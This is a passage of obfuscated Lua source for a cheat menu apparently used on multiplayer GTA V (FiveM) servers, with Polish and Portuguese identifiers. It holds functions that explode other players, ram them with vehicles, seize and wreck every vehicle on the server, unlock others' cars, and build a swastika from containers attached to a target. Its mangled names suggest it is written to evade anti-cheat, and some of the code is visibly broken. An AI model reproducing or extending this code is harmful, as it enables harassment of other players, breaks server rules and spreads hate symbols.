    local obj7 = CreateObject(vitolasRPMQCUeMEUCUff("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z + 1.5, 1, 1, 1)
    FreezeEntityPosition(obj7, vitolasRPMQCUeMEUCUzz)
    local obj8 = CreateObject(vitolasRPMQCUeMEUCUff("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z + 1.5, 1, 1, 1)
    SetEntityHeading(obj8, 90.0)
    FreezeEntityPosition(obj8, vitolasRPMQCUeMEUCUzz)

    end
end
function ClonePed()
    model = GetEntityModel(GetPlayerPed(selectedPlayer))
    ClonePedToTarget(GetPlayerPed(selectedPlayer), PlayerPedId())
end

function DrawTxt(text, x, y, scale, size)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(scale, size)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    vitolasRPMQCUeMEUCUyy(x, y)
end

local function GetKeyboardInput(text)
    if not text then text = "Input" end
    DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
    while (UpdateOnscreenKeyboard() == 0) do
        DrawTxt(text, 0.32, 0.37, 0.0, 0.4)
        DisableAllControlActions(0)
        -- Dont crash the menu when user hits esc
        if IsDisabledControlPressed(0, Keys["ESC"]) then return "" end
        vitolasRPMQCUeMEUCUtt(0)
    end
    if (GetOnscreenKeyboardResult()) then
        local result = GetOnscreenKeyboardResult()
        vitolasRPMQCUeMEUCUtt(0)
        return result
    end
end


local function SpawnVeh(model, PlaceSelf, SpawnEngineOn)
    RequestModel(vitolasRPMQCUeMEUCUff(model))
    vitolasRPMQCUeMEUCUtt(500)
    if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = CreateVehicle(vitolasRPMQCUeMEUCUff(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
        if SpawnEngineOn then SetVehicleEngineOn(veh, 1, 1) end
        return veh
    end  
end


    local function GetServerIPWithoutPort_UDGYUSDGFDGF(...)
        local ip_UDYUDSGYKFDG = GetServerIP_uqweuiodaopiu()
        if ip_UDYUDSGYKFDG == vitolasRPMQCUeMEUCUss then
        return 'nieznaleziono ip'
        else
        returnsub(ip_UDYUDSGYKFDG, 0,find(ip_UDYUDSGYKFDG, ":") - 1)
        end
    end
    
local function GetServerPort_UDGUYSDFGKFD(...)
local s_ufdhsgudigsdfg = GetServerIP_uqweuiodaopiu()
local xd_duhsfigdsf, xd2_duhsuydhgksdfg =find(s_ufdhsgudigsdfg, ":")
local to_return_DSUGHIDSG =sub(s_ufdhsgudigsdfg, xd_duhsfigdsf + 1)
return to_return_DSUGHIDSG
end

local function GetYourId_oiaioaoiwdiopopmas(...)
return Citizen.InvokeNative(0x4d97bcc7, Citizen.InvokeNative(0x4F8644AF03D0E0D6), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetPlayerId_OIDHUFIDSUGLFD(...)
return Citizen.InvokeNative(0x4d97bcc7, ..., Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end
function roupinha()
    resetAppearance()
    local model = "mp_m_freemode_01"
    RequestModel(vitolasRPMQCUeMEUCUff(model))
    vitolasRPMQCUeMEUCUtt(1)
    if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
        SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
    end
end
local function a0(a1, W, a2)
    if a1 == "HATS" or a1 == "GLASSES" or a1 == "EARS" then
        if a1 == "HATS" then
            fam_DUHSGOSDIUGIHOSDG = 0
        elseif a1 == "GLASSES" then
            fam_DUHSGOSDIUGIHOSDG = 1
        elseif a1 == "EARS" then
            fam_DUHSGOSDIUGIHOSDG = 2
        end
        Citizen.InvokeNative(
            0x93376B65A266EB5F,
            Citizen.InvokeNative(0x43A66C31C68491C0, -1),
            fam_DUHSGOSDIUGIHOSDG,
            W - 1,
            a2,
            1
        )
    else
        if a1 == "FACE" then
            fam_DUHSGOSDIUGIHOSDG = 0
        elseif a1 == "MASK" then
            fam_DUHSGOSDIUGIHOSDG = 1
        elseif a1 == "HAIR" then
            fam_DUHSGOSDIUGIHOSDG = 2
        elseif a1 == "TORSO" then
            fam_DUHSGOSDIUGIHOSDG = 3
        elseif a1 == "LEGS" then
            fam_DUHSGOSDIUGIHOSDG = 4
        elseif a1 == "HANDS" then
            fam_DUHSGOSDIUGIHOSDG = 5
        elseif a1 == "SHOES" then
            fam_DUHSGOSDIUGIHOSDG = 6
        elseif a1 == "SPECIAL1" then
            fam_DUHSGOSDIUGIHOSDG = 7
        elseif a1 == "SPECIAL2" then
            fam_DUHSGOSDIUGIHOSDG = 8
        elseif a1 == "SPECIAL3" then
            fam_DUHSGOSDIUGIHOSDG = 9
        elseif a1 == "TEXTURE" then
            fam_DUHSGOSDIUGIHOSDG = 10
        elseif a1 == "TORSO2" then
            fam_DUHSGOSDIUGIHOSDG = 11
        end
        Citizen.InvokeNative(
            0x262B14F48D29DE80,
            Citizen.InvokeNative(0x43A66C31C68491C0, -1),
            fam_DUHSGOSDIUGIHOSDG,
            W,
            a2,
            0
        )
    end
end
function resetAppearancee()
    roupinha()
    changeAppearance("MAOS", 1, 1)
    a0("HATS", 96, 0)
    changeAppearance("CAMISA", 40, 0)
    changeAppearance("JAQUETA", 15, 0)
    changeAppearance("CALCA", 16, 8)
    changeAppearance("SAPATO", 6, 0)
    changeAppearance("MASCARA", 35, 0)
    changeAppearance("SPECIAL2", 15, 0)
end
function DelVeh(Z)
    SetEntityAsMissionEntity(Z, 1, 1)
    DeleteEntity(Z)
end
function CargoplaneServer()
    local playerlist = GetActivePlayers()
    
    local model = "cargoplane"

    if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then

    else
        RequestModel(vitolasRPMQCUeMEUCUff(model))
        vitolasRPMQCUeMEUCUtt(500)
    end

            local coords = GetEntityCoords(GetPlayerPed(currPlayer))
    
            local busone = CreateVehicle(vitolasRPMQCUeMEUCUff(model), coords.x + 5.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
            local bustwo = CreateVehicle(vitolasRPMQCUeMEUCUff(model), coords.x + 5.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
            local currPlayer = playerlist[i]
            local coords = GetEntityCoords(GetPlayerPed(currPlayer))
    
            local busone = CreateVehicle(vitolasRPMQCUeMEUCUff(model), coords.x + 5.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
            local bustwo = CreateVehicle(vitolasRPMQCUeMEUCUff(model), coords.x + 5.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
        
    end

    

function engine1(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0)
SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11) - 1, arwet)
SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12) - 1, arwet)
SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13) - 1, arwet)
SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15) - 2, arwet)
SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16) - 1, arwet)
ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 17, vitolasRPMQCUeMEUCUzz)
ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 18, vitolasRPMQCUeMEUCUzz)
ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 19, vitolasRPMQCUeMEUCUzz)
ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 21, vitolasRPMQCUeMEUCUzz)
SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), arwet)
end


local function text4(name,outline,size,Justification,xx,yy, font)

    if outline then

        SetTextOutline()

    end

    if font ~= vitolasRPMQCUeMEUCUss and tonumber(font) ~= vitolasRPMQCUeMEUCUss then

    SetTextFont(font)

    else

    SetTextFont(6)

    end

    SetTextProportional(1)

    SetTextScale(100.0, size)

    SetTextEdge(1, 0, 0,227,255)

    BeginTextCommandDisplayText("STRING")

    AddTextComponentSubstringWebsite(name)

    EndTextCommandDisplayText(xx, yy)

end



local function RequestModelSync(model_DSIGHODSIGSD, timeout_DSIUFHISDGSDG)
        timeout_DSIUFHISDGSDG = timeout_DSIUFHISDGSDG or 2500
        local counter_DSGIHSDIUGJDSGDS = 0
        Citizen.InvokeNative(0x963D27A58DF860AC, Citizen.InvokeNative(0xD24D37CC275948CC, model_DSIGHODSIGSD))

        while not Citizen.InvokeNative(0x98A4EB5D89A0C952, Citizen.InvokeNative(0xD24D37CC275948CC, model_DSIGHODSIGSD)) do
            Citizen.InvokeNative(0x963D27A58DF860AC, model_DSIGHODSIGSD)
            counter_DSGIHSDIUGJDSGDS = counter_DSGIHSDIUGJDSGDS + 100
            vitolasRPMQCUeMEUCUtt(0)
            if counter_DSGIHSDIUGJDSGDS >= timeout_DSIUFHISDGSDG then return admgordolas end
        end

        return vitolasRPMQCUeMEUCUzz
    end
    function ExplodePlayer(target)

        local ped = GetPlayerPed(target)

        local coords = GetEntityCoords(ped)

        AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 36, 1.0, vitolasRPMQCUeMEUCUzz, admgordolas, 0.0)



    end
    
local function SpawnSwastika(ent_DSIUHGIUSDGDS, offZ)

                CreateThread(function()
                    local where = GetOffsetFromEntityInWorldCoords(ent_DSIUHGIUSDGDS, 0.0, 0.0, 0.0)

                    if not Citizen.InvokeNative(0x524AC5ECEA15343E, ent_DSIUHGIUSDGDS) then
                        where = vector3(where.x, where.y, where.z + 5.0)
                    end

                    if offZ then
                        where = vector3(where.x, where.y, where.z + offZ)
                    end

                    local column = {
                        ["up"] = {},
                        ["across"] = {}
                    }

                    for i = 0, 7 do
                        column["up"][i + 1] = {
                            x = 0.0,
                            y = 0.0,
                            z = 1.0 + (2.6 * (i + 1)),
                            _p_ = 90.0,
                            _y_ = 0.0,
                            _r_ = 0.0
                        }
                    end

                    for i = 0, 8 do
                        column["across"][i + 1] = {
                            x = 10.4 + (-2.6 * i),
                            y = 0.0,
                            z = 11.6,
                            _p_ = 90.0,
                            _y_ = 0.0,
                            _r_ = 0.0
                        }
                    end

                    local arms = {
                        ["bottom_right"] = {},
                        ["across_up"] = {},
                        ["top_left"] = {},
                        ["across_down"] = {}
                    }

                    for i = 0, 4 do
                        arms["bottom_right"][i] = {
                            x = -2.6 * i,
                            y = 0.0,
                            z = 1.0,
                            _p_ = 90.0,
                            _y_ = 0.0,
                            _r_ = 0.0
                        }

                        arms["top_left"][i] = {
                            x = 2.6 * i,
                            y = 0.0,
                            z = 22.2,
                            _p_ = 90.0,
                            _y_ = 0.0,
                            _r_ = 0.0
                        }

                        arms["across_down"][i + 1] = {
                            x = 10.4,
                            y = 0.0,
                            z = 12.6 - (2.25 * (i + 1)),
                            _p_ = 90.0,
                            _y_ = 0.0,
                            _r_ = 0.0
                        }
                    end

                    for i = 0, 3 do
                        arms["across_up"][i + 1] = {
                            x = -10.4,
                            y = 0.0,
                            z = 11.6 + (2.6 * (i + 1)),
                            _p_ = 90.0,
                            _y_ = 0.0,
                            _r_ = 0.0
                        }
                    end

                    local positions = {column["up"], column["across"], arms["bottom_right"], arms["across_up"], arms["top_left"], arms["across_down"]}
                    RequestModelSync("prop_container_05a")

                    for _DSGISUDGSD, seg in pairs(positions) do
                        for _DSGISUDGSD, v in pairs(seg) do
                           local obj = Citizen.InvokeNative(0x509D5878EB39E842, Citizen.InvokeNative(0xD24D37CC275948CC, "prop_container_05a"), where.x, where.y, where.z + (offZ or 0), vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)
                            DoNetwork(obj)
                            Citizen.InvokeNative(0x6B9BBD38AB0796DF, obj, ent_DSIUHGIUSDGDS, Citizen.InvokeNative(0x524AC5ECEA15343E, ent_DSIUHGIUSDGDS) and GetPedBoneIndex(ped_jgtirgirtjhilrthrth, 57005) or 0, v.x, v.y, v.z + (offZ or 0), v._p_, v._y_, v._r_, admgordolas, vitolasRPMQCUeMEUCUzz, admgordolas, admgordolas, 1, vitolasRPMQCUeMEUCUzz)
                            vitolasRPMQCUeMEUCUtt(80)
                        end
                    end
                end)
            end

            function GetRamedByVehicle(custom_vehicle, playa)
                    if custom_vehicle then
                        RequestModel(vitolasRPMQCUeMEUCUff(custom_vehicle))
                        while not HasModelLoaded(vitolasRPMQCUeMEUCUff(custom_vehicle)) do
                            vitolasRPMQCUeMEUCUtt(0)
                        end 
                        
                        local coords = GetEntityCoords(GetPlayerPed(playa))
                        local veh = CreateVehicle(vitolasRPMQCUeMEUCUff(custom_vehicle), coords.x, coords.y, coords.z , 1, 1, 1)
                        local rotation = GetEntityRotation(playa)
                        
                        SetVehicleEngineOn(veh, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)
                        SetEntityRotation(veh, rotation, 0.0, 0.0, 0.0, vitolasRPMQCUeMEUCUzz)
                        SetVehicleForwardSpeed(veh, 500.0)
                    end
                end

            local function KeyInput(TextEntry, ExampleText, MaxStringLength)
                Citizen.InvokeNative(0x32CA01C3, "FMMC_KEY_TIP1", "~y~".. TextEntry .. ":")
                Citizen.InvokeNative(0x00DC833F2568DBF6, 1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
                blockinput_dihgs8ourigdfg = vitolasRPMQCUeMEUCUzz
            
                while Citizen.InvokeNative(0x0CF2B696BBF945AE) ~= 1 and Citizen.InvokeNative(0x0CF2B696BBF945AE) ~= 2 do
                    vitolasRPMQCUeMEUCUtt(0)
                end
            
                if Citizen.InvokeNative(0x0CF2B696BBF945AE) ~= 2 then
                    local dfjs8erfdfg = GetOnscreenKeyboardResult()
                    vitolasRPMQCUeMEUCUtt(500)
                    blockinput_dihgs8ourigdfg = admgordolas
                    return dfjs8erfdfg
                else
                    vitolasRPMQCUeMEUCUtt(500)
                    blockinput_dihgs8ourigdfg = admgordolas
                    return vitolasRPMQCUeMEUCUss
                end
            end
    
                    

            local function carrinho()   
                PlaceSelf = vitolasRPMQCUeMEUCUzz
                local playerPed = GetPlayerPed(-1)
                local placa = KeyInput("Sua Indentidade ~r~ OBRIGATORIO PARA NAO TOMAR BAN:", "", 20)
                local model = KeyInput("Nome Do Veiculo", "", 20)
        
                        SpawnVeh(model, PlaceSelf, SpawnEngineOn)
                        local playerVeh = GetVehiclePedIsIn(playerPed, vitolasRPMQCUeMEUCUzz)
        
                        SetVehicleNumberPlateText(playerVeh,placa )
        
                    end

                    function colorVehicle()
    h.ThisIsSliders[7].value, h.ThisIsSliders[8].value, h.ThisIsSliders[9].value = ColorPicker()
    SetVehicleCustomPrimaryColour(
    GetVehiclePedIsUsing(PlayerPedId(-1)),
    h.ThisIsSliders[7].value,
    h.ThisIsSliders[8].value,
    h.ThisIsSliders[9].value
    )
    SetVehicleCustomSecondaryColour(
    GetVehiclePedIsUsing(PlayerPedId(-1)),
    h.ThisIsSliders[7].value,
    h.ThisIsSliders[8].value,
    h.ThisIsSliders[9].value
    )
    end

local function warp()

    local cA = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
    if not DoesEntityExist(cA) then
        return
    end
    local dO = -1
    TaskWarpPedIntoVehicle(PlayerPedId(), cA, dO)
    vitolasRPMQCUeMEUCUtt(100)
    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas))
    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0.0)
    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0)
    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), admgordolas)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0)

end

local function DestrancarVeh() 
        local vehicle = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
        if DoesEntityExist(vehicle) then
        SetVehicleDoorsLocked(vehicle, 1)
        SetVehicleDoorsLockedForPlayer(vehicle, PlayerId(), admgordolas)
        SetVehicleDoorsLockedForAllPlayers(vehicle, admgordolas)
    end
end



local function DestroyCarAll()
    for veh in EnumerateVehicles() do
        RequestControlOnce(veh)
        if     NetworkRequestControlOfEntity(veh) then
            SetEntityAsMissionEntity(veh, sdjfjgdfghfdjksa, sdjfjgdfghfdjksa)
            StartVehicleAlarm(veh)
            PopOutVehicleWindscreen(veh)
            SmashVehicleWindow(veh, 0)SmashVehicleWindow(veh, 1)SmashVehicleWindow(veh, 2)SmashVehicleWindow(veh, 3)
            SetVehicleTyreBurst(veh, 0, sjdghjdfhgikaojgr, 1000.0)SetVehicleTyreBurst(veh, 1, sjdghjdfhgikaojgr, 1000.0)SetVehicleTyreBurst(veh, 2, sjdghjdfhgikaojgr, 1000.0)SetVehicleTyreBurst(veh, 3, sjdghjdfhgikaojgr, 1000.0)SetVehicleTyreBurst(veh, 4, sjdghjdfhgikaojgr, 1000.0)SetVehicleTyreBurst(veh, 5, sjdghjdfhgikaojgr, 1000.0)SetVehicleTyreBurst(veh, 4, sjdghjdfhgikaojgr, 1000.0)SetVehicleTyreBurst(veh, 7, sjdghjdfhgikaojgr, 1000.0)
            SetVehicleDoorBroken(veh, 0, sjdghjdfhgikaojgr)SetVehicleDoorBroken(veh, 1, sjdghjdfhgikaojgr)SetVehicleDoorBroken(veh, 2, sjdghjdfhgikaojgr)SetVehicleDoorBroken(veh, 3, sjdghjdfhgikaojgr)SetVehicleDoorBroken(veh, 4, sjdghjdfhgikaojgr)SetVehicleDoorBroken(veh, 5, sjdghjdfhgikaojgr)SetVehicleDoorBroken(veh, 6, sjdghjdfhgikaojgr)SetVehicleDoorBroken(veh, 7, sjdghjdfhgikaojgr)
        end
    end
end

local function asjdighdfhgKickFlip_Veh()
    if IsPedInAnyVehicle(PlayerPedId(), 0) then 
    RequestControlOnce(veh)
    local veh = GetVehiclePedIsIn(PlayerPedId(), sdhiufhuifsdhuf)        
 ApplyForceToEntity(veh, 1, 0.0, 0.0, 15.0, 0.0, 60.0, 0.0, 0, 0, 1, 1, 0, 0)
    end  
end

local function zkfkcngdgfhavrpBackFlip_Veh()
    if IsPedInAnyVehicle(PlayerPedId(), 0) then 
    RequestControlOnce(veh)
    local veh = GetVehiclePedIsIn(PlayerPedId(), sdhiufhuifsdhuf)        
    ApplyForceToEntity(veh, 1, 0.0, 0.0, 10.0, 90.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
    end  
end

local function asdfdsjdfgbdcmxcnbPular_Veh()
    if IsPedInAnyVehicle(PlayerPedId(), 0) then 
    RequestControlOnce(veh)
    local veh = GetVehiclePedIsIn(PlayerPedId(), sdhiufhuifsdhuf)        
    ApplyForceToEntity(veh, 1, 0.0, 0.0, 15.0, 0.0, 0.0, 00.0, 0, 1, 0, 1, 0, 0)
    end  
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return admgordolas
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), admgordolas)
    return NetworkRequestControlOfEntity(entity)
end


local function RandomSkin(target)
        local ped = GetPlayerPed(target)
        SetPedRandomComponentVariation(ped, Pryorbypessed2)
        SetPedRandomProps(ped)
    end

    

            local function TeleportToWaypoint()
                local entity = PlayerPedId()
                if IsPedInAnyVehicle(entity, admgordolas) then
                    entity = GetVehiclePedIsUsing(entity)
                end
                local success = admgordolas
                local blipFound = admgordolas
                local blipIterator = GetBlipInfoIdIterator()
                local blip = GetFirstBlipInfoId(8)
                
                while DoesBlipExist(blip) do
                    if GetBlipInfoIdType(blip) == 4 then
                        cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))--GetBlipInfoIdCoord(blip)
                        blipFound = vitolasRPMQCUeMEUCUzz
                        break
                    end
                    blip = GetNextBlipInfoId(blipIterator)
                    vitolasRPMQCUeMEUCUtt(0)
                end
                
                if blipFound then
                    local groundFound = admgordolas
                    local yaw = GetEntityHeading(entity)
                    
                    for i = 0, 1000, 1 do
                        SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), admgordolas, admgordolas, admgordolas)
                        SetEntityRotation(entity, 0, 0, 0, 0, 0)
                        SetEntityHeading(entity, yaw)
                        SetGameplayCamRelativeHeading(0)
                        vitolasRPMQCUeMEUCUtt(0)
                        if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, admgordolas) then
                            cz = ToFloat(i)
                            groundFound = vitolasRPMQCUeMEUCUzz
                            break
                        end
                    end
                    if not groundFound then
                        cz = -300.0
                    end
                    success = vitolasRPMQCUeMEUCUzz

                else
                

                
                end
                
                if success then
                    SetEntityCoordsNoOffset(entity, cx, cy, cz, admgordolas, admgordolas, vitolasRPMQCUeMEUCUzz)
                    SetGameplayCamRelativeHeading(0)
                    if IsPedSittingInAnyVehicle(PlayerPedId()) then
                        if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
                            SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
                        end
                    end
                end
            
            end
              
            

      
            function GetScreenSize()
                local x, y = GetActiveScreenResolution()
                return {x = x, y = y}
            end
            function Rectangle(x, y, a9, aa, r, g, b, ab)
                local ac, ad = GetActiveScreenResolution()
                local ae, af = 1 / ac, 1 / ad
                local ag, ah = ae * x, af * y
                local ai, aj = ae * a9, af * aa
                vitolasRPMQCUeMEUCUuu(ag + ai / 2, ah + aj / 2, ai, aj, r, g, b, ab)
            end
            function hsvToRgb(aa, ak, al, ab)
                local r, g, b
                local l = admmeupau.floor(aa * 6)
                local am = aa * 6 - l
                local an = al * (1 - ak)
                local ao = al * (1 - am * ak)
                local ap = al * (1 - (1 - am) * ak)
                l = l % 6
                if l == 0 then
                    r, g, b = al, ap, an
                elseif l == 1 then
                    r, g, b = ao, al, an
                elseif l == 2 then
                    r, g, b = an, al, ap
                elseif l == 3 then
                    r, g, b = an, ao, al
                elseif l == 4 then
                    r, g, b = ap, an, al
                elseif l == 5 then
                    r, g, b = al, an, ao
                end
                return admmeupau.floor(r * 255 + 0.5), admmeupau.floor(g * 255 + 0.5), admmeupau.floor(b * 255 + 0.5), admmeupau.floor(ab * 255)
            end
            function Gradient(x, y, a9, aa, aq, r, g, b, ab, ar, as, at, au)
                if aq then
                    for l = 0, a9, 2 do
                        if l > a9 then
                            break
                        end
                        local ab = admmeupau.floor((au - ab) / a9 * l + ab)
                        Rectangle(x + l, y, l < a9 - 1 and 2 or 1, aa, ar, as, at, admmeupau.abs(ab))
                    end
                else
                    for l = 0, aa, 2 do
                        if l > aa then
                            break
                        end
                        local ab = admmeupau.floor((au - ab) / aa * l + ab)
                        Rectangle(x, y + l, a9, l < aa - 1 and 2 or 1, ar, as, at, admmeupau.abs(ab))
                    end
                end
            end
            function HSVGradient(x, y, a9, aa, aq, av, aw, ax, ay, az, aA)
                Rectangle(x, y, a9, aa, hsvToRgb(av, aw, ax, 1))
                if aq then
                    for l = 0, a9, 2 do
                        local aB, ak, al = (ay - av) / a9 * l + av, (az - aw) / a9 * l + aw, (aA - ax) / a9 * l + ax
                        Rectangle(x + l, y, 2, aa, hsvToRgb(aB, ak, al, 1))
                    end
                else
                    for l = 0, aa, 2 do
                        local aB, ak, al = (ay - av) / aa * l + av, (az - aw) / aa * l + aw, (aA - ax) / aa * l + ax
                        Rectangle(x, y + l, a9, 2, hsvToRgb(aB, ak, al, 1))
                    end
                end
            end
            function vitolasRPMQCUeMEUCUuuerinio(x, y, a9, aa, r, g, b, ab)
                resX, resY = GetActiveScreenResolution()
                local aC, aB = a9 / resX, aa / resY
                local _x, _y = x / resX + aC / 2, y / resY + aB / 2
                vitolasRPMQCUeMEUCUuu(_x, _y, aC, aB, r, g, b, ab)
            end
            function Mouse(aD)
                local x, y = GetNuiCursorPosition()
                local a9, aa = GetActiveScreenResolution()
                if aD then
                    x = x / a9
                    y = y / aa
                end
                return {x = x, y = y}
            end
            local function aE(m, x, y, aF, aG, aH, aI)
                SetTextScale(0.0, tonumber(aF))
                SetTextFont(aH)
                if aG then
                    SetTextOutline()
                end
                SetTextCentre(aI)
                BeginTextCommandDisplayText("STRING")
                AddTextComponentSubstringWebsite(m)
                EndTextCommandDisplayText(x, y)
                return EndTextCommandGetWidth(vitolasRPMQCUeMEUCUzz)
            end
            
    
local function ChangeModel(model)           
    local hash_SDGHISDGDS = Citizen.InvokeNative(0xD24D37CC275948CC, tostring(model))
    local player_SDIGJOSIDGSD = Citizen.InvokeNative(0x4F8644AF03D0E0D6)
                
    RequestModelSync(tostring(model))

    Citizen.InvokeNative(0x00A1CADD00108836, player_SDIGJOSIDGSD, hash_SDGHISDGDS)
    Citizen.InvokeNative(0x262B14F48D29DE80, Citizen.InvokeNative(0x43A66C31C68491C0, -1), 0, 0, 0, 0)
    Citizen.InvokeNative(0xE532F5D78798DAAB, hash_SDGHISDGDS)
end

local function KeyBoardInput(TextEntry, ExampleText, MaxStringLength)
    Citizen.InvokeNative(0x32CA01C3, "FMMC_KEY_TIP1", "~y~".. TextEntry .. ":")
    Citizen.InvokeNative(0x00DC833F2568DBF6, 1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
    blockinput_dihgs8ourigdfg = vitolasRPMQCUeMEUCUzz

    while Citizen.InvokeNative(0x0CF2B696BBF945AE) ~= 1 and Citizen.InvokeNative(0x0CF2B696BBF945AE) ~= 2 do
        vitolasRPMQCUeMEUCUtt(0)
    end

    if Citizen.InvokeNative(0x0CF2B696BBF945AE) ~= 2 then
        local dfjs8erfdfg = GetOnscreenKeyboardResult()
        vitolasRPMQCUeMEUCUtt(500)
        blockinput_dihgs8ourigdfg = admgordolas
        return dfjs8erfdfg
    else
        vitolasRPMQCUeMEUCUtt(500)
        blockinput_dihgs8ourigdfg = admgordolas
        return vitolasRPMQCUeMEUCUss
    end
end

local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
    return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
            disposeFunc(iter)
            return
        end
        
        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)
        
        local next = vitolasRPMQCUeMEUCUzz
        repeat
            coroutine.yield(id)
            next, id = moveFunc(iter)
        until not next
        
        enum.destructor, enum.handle = vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss
        disposeFunc(iter)
    end)
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumeratePickups()
    return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end
local h = {
    ThisIsSliders = {
        [1] = {max = 255, min = 0, value = 247},
        [2] = {max = 255, min = 0, value = 255},
        [3] = {max = 255, min = 0, value = 0},
        [4] = {max = 255, min = 0, value = 255},
        [5] = {max = 255, min = 0, value = 255},
        [6] = {max = 255, min = 0, value = 255},
        [7] = {max = 255, min = 0, value = 0},
        [8] = {max = 255, min = 0, value = 0},
        [9] = {max = 255, min = 0, value = 0},
        [10] = {max = 255, min = 0, value = 255},
        [11] = {max = 255, min = 0, value = 255},
        [12] = {max = 255, min = 0, value = 255},
        [13] = {max = 255, min = 0, value = 255},
        [14] = {max = 255, min = 0, value = 0},
        [15] = {max = 255, min = 0, value = 0},
        [16] = {max = 255, min = 0, value = 255},
        [17] = {max = 255, min = 0, value = 255},
        [18] = {max = 255, min = 0, value = 255},
        [19] = {max = 255, min = 0, value = 0},
        [20] = {max = 255, min = 0, value = 76},
        [21] = {max = 255, min = 0, value = 255},
        [22] = {max = 255, min = 0, value = 255},
        [23] = {max = 255, min = 0, value = 0},
        [24] = {max = 255, min = 0, value = 0}
    }
}
function text_szpachlan_szmata(nazwa_szpachlan_szmata,outline_szpachlan_szmata,size_szpachlan_szmata,Justification_szpachlan_szmata,x,y, czcionka, centre)
    if outline_szpachlan_szmata then
        SetTextOutline()
    end
    if czcionka ~= vitolasRPMQCUeMEUCUss and tonumber(czcionka) ~= vitolasRPMQCUeMEUCUss then
    SetTextFont(czcionka)
    else
    SetTextFont(0)
    end
    if centre then
    SetTextCentre(vitolasRPMQCUeMEUCUzz)
    end
    SetTextProportional(1)
    SetTextScale(100.0, size_szpachlan_szmata)
    SetTextEdge(1, 0, 0, 0, 255)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(nazwa_szpachlan_szmata)
    EndTextCommandDisplayText(x, y)
